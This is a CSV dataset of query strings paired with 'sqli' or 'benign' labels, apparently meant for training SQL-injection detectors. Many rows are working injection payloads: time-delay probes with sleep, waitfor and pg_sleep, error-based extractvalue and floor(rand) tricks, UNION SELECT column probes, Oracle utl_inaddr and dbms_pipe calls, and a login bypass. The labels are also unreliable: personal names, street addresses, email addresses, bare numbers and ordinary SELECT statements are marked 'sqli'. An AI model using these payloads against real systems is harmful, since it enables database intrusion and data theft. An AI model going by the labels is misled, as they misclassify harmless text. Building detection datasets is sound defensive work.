query,label
"1 where 6044  =  6044 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sqli
calle clavel 30 11?b,sqli
"hospitalet de llobregat, l'",sqli
"-2717"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
SELECT AVG ( thin ) FROM force SELECT SUM ( money ) ,sqli
a' or 3  =  3--,sqli
"   SELECT grade, reason, automobileFROM no WHERE obtain  IS NOT NULL",sqli
SELECT TOP 3 * FROM power WHERE answer = 'be' SELECT * FROM tube,sqli
SELECT distance ( s )  FROM safety UNION,sqli
berleand@campanasextractoras.la,sqli
42180,sqli
fililberto,sqli
SELECT * FROM nearby WHERE    NOT toward = 'letter',sqli
SELECT solve FROM popular UNION SELECT find FROM helpful ORDER BY wheel,sqli
SELECT unhappy FROM baby UNION SELECT kill FROM cake ORDER BY arrow,sqli
SELECT * FROM captured WHERE    NOT feathers = 'mountain',sqli
"1'  )   where 8586  =  8586 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
 UPDATE once SET stay = 'smell'WHERE worth = 'dirt',sqli
"1 where 2278  =  2278 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sqli
"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",sqli
or sleep  (  __TIME__  )  #,sqli
SELECT shake,sqli
SELECT AVG ( myself )  FROM phrase  SELECT SUM ( track ) ,sqli
SELECT importance ( s ) FROM earth INNER JOIN,sqli
"c/ virgen de la paloma, 107",sqli
DELETE FROM character WHERE passage = 'grandfather',sqli
SELECT AVG ( bet ) FROM location,sqli
end,sqli
"  SELECT SUBTIME ( ""10:24:21"", ""-3:2:5"" ) ;",sqli
oti sineiro,sqli
SELECT * FROM draw WHERE not NOT LIKE '[spite]%',sqli
"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",sqli
shupe,sqli
SELECT * FROM poor WHERE whole = 'firm' FETCH FIRST 3 ROWS ONLY,sqli
-9556'  )   where 2472  =  2472 or   (  2883  =  9968  )  *9968--,sqli
" SELECT * FROM another ORDER BY willing ASC, pot DESC",sqli
fuente el olmo de scar,sqli
SELECT * FROM buffalo WHERE Price NOT BETWEEN 10 AND 20,sqli
solar,sqli
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'iwmy'  =  'iwmy,sqli
"1'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
"1'  )   as yhgk where 9246  =  9246 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
emetrio,sqli
"1""  )   as semi where 4260  =  4260",sqli
oliveira_aptekman@engibraltar.va,sqli
 UPDATE shop SET must = 'decide'WHERE cloth = 'shut',sqli
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,sqli
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'njnr'  =  'njnr",sqli
SELECT west FROM dinner UNION SELECT task FROM jar ORDER BY wheel,sqli
byron@vinavilano.gl,sqli
ulldemol bujeque,sqli
SELECT COUNT ( flies ) FROM whispered,sqli
if  (  2697  =  2008  )   select 2697 else drop function jcoo--,sqli
"1""   )    )    and 7533  =  7533 and    (    (   ""gkca""  =  ""gkca",sqli
"-3116""   )    )     )   union all select 4600,4600,4600,4600--",sqli
SELECT * FROM neck WHERE when = 'how' FETCH FIRST 3 ROWS ONLY,sqli
ikediek torrades,sqli
SELECT * FROM Customers GO,sqli
-8760  )   where 8277  =  8277 union all select 8277--,sqli
SELECT * FROM when WHERE Price NOT BETWEEN 10 AND 20,sqli
SELECT * FROM pile 3,sqli
SELECT * FROM policeman FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM half,sqli
SELECT * FROM to FETCH FIRST 50 PERCENT ROWS ONLY,sqli
SELECT * FROM primitive FETCH FIRST 3 ROWS ONLY,sqli
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'hstg' like 'hstg",sqli
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   +'",sqli
"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""xccy""  =  ""xccy",sqli
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",sqli
1   )    )     )   union all select null--,sqli
"1""   )    )    as knyf where 8109  =  8109 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
"1%'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  '",sqli
paz,sqli
"1'||  (  select 'xyft' from dual where 8250  =  8250 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",sqli
"1"" where 4294  =  4294 and make_set  (  2543  =  7988,7988  )  --",sqli
"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",sqli
SELECT * FROM wp_posts WHERE ID  =  28072 LIMIT 1,sqli
waitfor delay '0:0:5' and    (    (     (  8981  =  8981,sqli
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,sqli
latimer@puntodevistafotografia.ve,sqli
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",sqli
SELECT well ( s )  FROM nothing LEFT JOIN,sqli
SELECT AVG ( wing ) FROM becoming,sqli
1769640000000000,sqli
"SELECT name, email FROM accounts WHERE active=1",benign
"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- gkcl",sqli
1%' waitfor delay '0:0:5' and '%'  =  ',sqli
"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
"1""  )   where 3390  =  3390",sqli
5a4a84e8a,sqli
SELECT period ( s )  FROM allow FULL OUTER JOIN,sqli
1 where 1519  =  1519,sqli
SELECT AVG ( fresh ) FROM child,sqli
SELECT * FROM nothing WHERE quick NOT LIKE '[share]%',sqli
denni,sqli
1'  )   as dpmh where 5281  =  5281 and 2006  =  2006,sqli
lorraine,sqli
SELECT COUNT ( mind ) FROM dog,sqli
herminia,sqli
"1'  )   where 3703  =  3703 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",sqli
3st59et982,sqli
"1""   )    )    as vxkn where 2443  =  2443 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
"1'+  (  select 'ixvd' where 4772  =  4772 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",sqli
" select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",sqli
" SELECT SupplierName, City, Country FROM Suppliers WHERE Country = 'Germany';",sqli
select   (  case when   (  6652  =  1932  )   then 6652 else 6652*  (  select 6652 from information_schema.character_sets  )   end  )  #,sqli
"calle manco, 109, 10-g",sqli
"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'mymg'  =  'mymg",sqli
"1""   )    )    as ngvf where 9912  =  9912 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
camp morante,sqli
aisha,sqli
1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',sqli
"  SELECT are AS face, stretch AS [steel]  FROM too",sqli
SELECT effort ( s )  FROM congress SELECT doll FROM say,sqli
" select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",sqli
"1%'   )    )     )   union all select null,null,null#",sqli
6015,sqli
"  SELECT shellsID AS ID, nice AS dangerous FROM travel",sqli
SELECT * FROM sit FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM apart,sqli
SELECT * FROM pony WHERE perhaps = 'ship' FETCH FIRST 3 ROWS ONLY,sqli
"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",sqli
SELECT AVG ( arrow ) FROM parent SELECT SUM ( atomic ) ,sqli
1745,sqli
"1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
ermina,sqli
SELECT * FROM children WHERE active = 'quiet' FETCH FIRST 3 ROWS ONLY,sqli
"1'   )    )    as owcw where 1107  =  1107 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sqli
"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",sqli
dalleto poroma,sqli
metrorragia,sqli
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'mfmk'  =  'mfmk,sqli
select case when 2599  =  7035 then 1 else null end--,sqli
jurez,sqli
 (  7098  =  7098 and sleep  (  5   )    ) ,sqli
"1"" where 2989  =  2989 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",sqli
"-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#",sqli
683880000000000,sqli
villanueva de huerva,sqli
SELECT * FROM energy WHERE bark = 'upon' FETCH FIRST 3 ROWS ONLY,sqli
villafranca del bierzo,sqli
SELECT TOP 3 * FROM hay WHERE religious = 'battle' SELECT * FROM slip,sqli
"admin""  )   or   (  ""1""  =  ""1""--",sqli
"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
SELECT COUNT ( rain )  FROM question,sqli
1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,sqli
"  SELECT trap,problem FROM high WHERE tie = 'danger' UNION SELECT attempt, inside FROM hunter",sqli
waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,sqli
SELECT TOP 3 * FROM freedom WHERE somewhere = 'acres',sqli
4676150000000000,sqli
63829565b,sqli
44,sqli
1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  '%'  =  ',sqli
-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,sqli
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz",sqli
1'   )    )    and 4650  =  1322#,sqli
SELECT * FROM flat FETCH FIRST 3 ROWS ONLY,sqli
SELECT fur FROM require UNION ALL SELECT gentle FROM weigh ORDER BY naturally,sqli
"  SELECT * FROM heavy WHERE compare NOT IN  ( 'team', 'attack', 'underline' )  ",sqli
SELECT * FROM porch FETCH FIRST 50 PERCENT ROWS ONLY,sqli
1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,sqli
"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # bzoq",sqli
-4947' order by 1#,sqli
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""ljkg""  =  ""ljkg",sqli
callie,sqli
burns-gerron@100mbps.ht,sqli
"  SELECT * FROM composed WHERE round IN  ( 'get', 'exact', 'customs' )  ",sqli
SELECT TOP 50 PERCENT * FROM picture SELECT * FROM rod FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,sqli
ruqiang,sqli
angilberto,sqli
1'+  (  select 'rejz' where 1530  =  1530 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',sqli
SELECT AVG ( six ) FROM join SELECT SUM ( attention ) ,sqli
1' and 7533  =  7533 and 'clqy' like 'clqy,sqli
SELECT * FROM south WHERE distance = 'temperature'  AND City = 'rope',sqli
SELECT TOP 3 * FROM arrangement WHERE blow = 'watch' SELECT * FROM longer,sqli
SELECT Count ( * )  AS DistinctCountries,sqli
6140460000000000,sqli
SELECT * FROM television FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM from,sqli
"-7007  )   union all select 6704,6704--",sqli
SELECT COUNT ( DISTINCT climate )  FROM direction,sqli
"1%'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   '%'  =  '",sqli
"1' and elt  (  9371  =  8882,8882  )   and 'vurh'  =  'vurh",sqli
uvalle urpina,sqli
1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'iuao'  =  'iuao,sqli
"virgen de los imposibles 162,",sqli
SELECT * FROM burst WHERE voyage = 'period'  OR sign = 'poetry',sqli
SELECT * FROM earth  WHERE courage NOT LIKE '[atomic]%',sqli
"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",sqli
" select sleep  (  5  )   and   (  ""zsjw"" like ""zsjw",sqli
"   SELECT bare,directly,brave,younger,stay     (  (  seed JOIN teacher ON ordinary.death =  everyone.consist )   INNER JOIN cleanON Orders.old =  stepped.fenceID ) ",sqli
dan,sqli
8930,sqli
SELECT * FROM thy,sqli
SELECT * FROM ago  WHERE noon = blank,sqli
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,sqli
04146926a,sqli
"1   )    )    as gcvw where 7363  =  7363 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",sqli
" SELECT * FROM rock ORDER BY port, friend",sqli
busqu,sqli
1 where 9361  =  9361 and 7478  =  9170--,sqli
"-9408%""   )    )    union all select 1841,1841,1841,1841,1841,1841--",sqli
8739,sqli
SELECT * FROM sit WHERE teach = 'rock',sqli
SELECT boy ( s )  FROM card SELECT carry ( s ) ,sqli
" SELECT * FROM family ORDER BY south, angle",sqli
wooland@indagacion.td,sqli
"1%'   )    )     )   union all select null,null,null,null,null,null,null--",sqli
SELECT MIN ( liquid )  AS wide FROM day,sqli
1' and 7533  =  7533 and 'jwgc'  =  'jwgc,sqli
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",sqli
SELECT price FROM products WHERE sku='SKU2290',benign
SELECT * FROM grandfather WHERE policeman = 'small',sqli
SELECT DISTINCT solid FROM help,sqli
SELECT COUNT ( leather ) FROM play,sqli
"1%""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,sqli
sidonio,sqli
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",sqli
"   SELECT south, president+ ', ' + heat+ ' ' + fact+ ', ' + finger AS which  FROM leader",sqli
"  SELECT seedID AS ID, facing AS claws FROM lack",sqli
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  4574  =  4574,sqli
min81t8,sqli
SELECT * FROM team WHERE subject = 'unknown',sqli
SELECT * FROM  ( SELECT right FROM world ) ,sqli
SELECT * FROM surface WHERE lot = 'beside'  OR involved = 'common',sqli
" SELECT LEFT ( CustomerName, 5 )  AS ExtractString FROM Customers;",sqli
SELECT * FROM breakfast FETCH FIRST 50 PERCENT ROWS ONLY,sqli
-2233' or   (  1807  =  7274  )  *7274,sqli
" SELECT FIELD ( ""q"", ""s"", ""q"", ""l"" ) ; ",sqli
select   (  case when   (  4205  =  9574  )   then 4205 else 1/  (  select 0  )   end  )  --,sqli
valverde de valdelacasa,sqli
SELECT Count ( * )  AS symbol,sqli
